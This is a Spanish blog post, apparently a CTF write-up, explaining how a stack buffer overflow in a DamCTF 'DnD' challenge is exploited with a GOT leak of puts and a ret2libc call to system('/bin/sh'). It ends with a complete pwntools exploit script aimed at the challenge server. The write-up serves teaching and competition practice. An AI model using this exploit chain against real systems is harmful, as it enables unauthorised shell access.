---
layout: post
title: DnD DamCTF
comments: true
categories: [Pwn, Writeups, HFCTF2025]
---

En este post veremos la resolución de un reto bastante chulo en el que tendremos que *leakear* una dirección de libc para poder invocar a system y obtener una shell. Este ejercicio nos llevó un rato y nos quedamos muy cerca, finalmente lo sacaron el resto de miembros de mi equipo. Utiliza una técnica muy útil e importante de conocer.

<br>
![Image]({{ site.baseurl }}/images/posts/damctf.png){:width="700px"}
<br>

# Reconocimiento

Se nos da un programa que simula batallas contra monstruos al estilo de [Dungeons and Dragons](https://dnd.wizards.com/es). En general el código es largo así que no lo incluiré. Lo que sí llama la atención es la función `win`, a la que se llama cuando ganas la partida:

```c++
void win(void)
{
  basic_ostream *pbVar1;
  char name [32];
  basic_string local_48 [9];
  allocator local_21;
  allocator *local_20;
  
  std::cout<<"Congratulations! Minstrals will sing of your triumphs for millenia to co me.";
  std::cout<<"What is your name, fierce warrior? ";

  fgets(name,256,stdin); // Buffer Overflow

  std::cout<<"We will remember you forever, "<<name;
  
  return;
}
```
*La salida de Ghidra es bastante más compleja pero la he simplificado.*

<br>

Vemos que la llamada a `fgets` almacena 256 bytes en `name`, que sólo puede almacenar 32. Tenemos un **buffer overflow**. El problema es que no tenemos nada interesante a donde saltar en el binario.

Por suerte sí que nos dan la libc entre los archivos del reto. En este punto nuestra idea será saltar a *system* en la libc pasando como argumento la cadena `"/bin/sh"`.

# Explotación

## Offset

Lo primero será encontrar el offset hasta la dirección de retorno para controlar el flujo de ejecución. Esto se hace de forma sencilla con `cyclic` en *gdb-peda* (ó *pwn cyclic* de *pwntools*):

<br>
![Image]({{ site.baseurl }}/images/posts/2025-05-11-DnD-DamCTF-1.png){:width="1000px"}
<br>

> Hay que tener en cuenta que para acceder a esta función debemos haber ganado la partida. Por simplicidad podemos atacar dos veces e ir probando, normalmente a la segunda ganaremos directamente.

## Extrayendo direcciones de libc

A la hora de saltar a libc siempre tenemos el problema de que las direcciones cambiarán con cada iteración. Por tanto no podremos saltar directamente, y deberemos extraerlas en tiempo de ejecución. Por suerte, sí que podemos leer la **GOT** (*Global Offset Table*), que hace de intermediaria, almacenando las direcciones de las funciones utilizadas de la libc. En este [artículo](https://ian.nl/blog/leak-libc-rop) se explica mucho mejor.

Para leer las direcciones de la GOT necesitamos una función que imprima, en este caso tenemos `puts` (en este caso lo he sacado de Ghidra, pero se pueden sacar estas funciones con `objdump -d binary | grep plt`):

<br>
![Image]({{ site.baseurl }}/images/posts/2025-05-11-DnD-DamCTF-2.png){:width="1000px"}
<br>

### Leakear la dirección base de libc

Teniendo puts podemos extraer su dirección de libc y calcular la dirección base de libc, que nos servirá a su vez para calcular la dirección de *system* y la dirección de la cadena `"/bin/sh"`.

Para sacar la dirección de *puts* en libc llamaremos a *puts* pasando como argumento su dirección en la GOT. Para cargar el argumento necesitaremos un gadget `pop rdi; ret;`, la idea será la siguiente:

```
payload = pop_rdi + puts@got + puts@plt
```

Para buscar el gadget utilizamos *ropper*:

```bash
ropper -f dnd/dnd  | grep "rdi"

[...]
0x0000000000402640: pop rdi; nop; pop rbp; ret;
[...]
```

No tenemos el `pop rdi` sólo así que tendremos que utilizar éste. El payload será algo así:

```
payload = pop_rdi_rbp + puts@got + trash_for_rbp + puts@plt + win
```

Metemos `win` al final para que una vez leakeada la dirección podamos volver a enviar otro payload.

### Calcular system y bin_sh

Una vez tenemos la dirección base de libc, podemos buscar el offset hasta `system` y hasta una cadena `"/bin/sh"`:

```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

```
system_libc = libc_base + system_offset
bin_sh_libc = libc_base + bin_sh_offset
```

## Conseguimos la shell

Para conseguir la shell deberemos cargar la cadena en *rdi* con el mismo gadget de antes y llamar a system:

```
payload = pop_rdi_rbp + bin_sh_libc + trash_for_rbp + system_libc
```

## Script

Para ejecutar el ataque podemos hacer un script con *pwntools*. Como dije antes la interacción para ganar el combate se limita a *atacar* dos veces al monstruo, por lo que hay que ejecutarlo varias veces hasta que de la casualidad que gane.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or './dnd')
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("dnd.chals.damctf.xyz", 30813)
    else:
        return process([elf.path] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

offset = 104

win = p64(0x000000000040286d)

# 0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
pop_rdi_rbp = p64(0x0000000000402640)

# 000000408100  002100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
puts_got = p64(0x000000408100) #p64(elf.got['puts'])

# 4029dc:	e8 df fa ff ff       	call   4024c0 <puts@plt>
puts_plt = p64(0x4024c0) #p64(elf.plt['puts'])

# 235: 0000000000087be0   550 FUNC    WEAK   DEFAULT   17 puts@@GLIBC_2.2.5
puts_offset = 0x0000000000087be0

# 1050: 0000000000058750    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
system_offset = 0x0000000000058750

bin_sh = next(libc.search(b"/bin/sh"))

io = start()

io.recvuntil(b'[r]un?')
io.sendline(b'a')

io.recvuntil(b'[r]un?')
io.sendline(b'a')

io.recvuntil(b'What is your name, fierce warrior?')

io.sendline(offset*b'A' + pop_rdi_rbp + puts_got + b"AAAAAAAA" + puts_plt + win)

## SEGUNDA EJECUCION

line = io.recvline()
log.info(line)
line = io.recvline()
log.success(line)
puts_libc = int.from_bytes(line[-8:-1], "little") # Leak puts libc addr
log.success("Leaked: " + hex(puts_libc))

libc.address = puts_libc - puts_offset

system_libc = p64(libc.address + system_offset)
bin_sh_libc = p64(libc.address + bin_sh)

# ret from libc for stack alignment
ret = p64(libc.address + 0x000000000002882f)

log.info("System_libc: " + hex(int.from_bytes(system_libc, "little")))
log.info("/bin/sh_libc: " + hex(int.from_bytes(bin_sh_libc, "little")))

io.sendline(offset*b'A' + ret + pop_rdi_rbp +  bin_sh_libc + b"AAAAAAAA" + system_libc)

io.interactive()
```

Si en local no funciona tiene que ver con que el sistema esté utilizando su propia versión de libc, lo que se puede resolver utilizando *pwninit* del paquete de *pwntools*.

<br>
![Image]({{ site.baseurl }}/images/posts/2025-05-11-DnD-DamCTF-3.png){:width="1000px"}
<br>

Puede que sea un poco denso, pero la técnica para leakear una dirección mediante una dirección de la GOT es muy útil. Si te ha gustado puedes leer el resto de posts. Y si tienes alguna duda deja un comentario!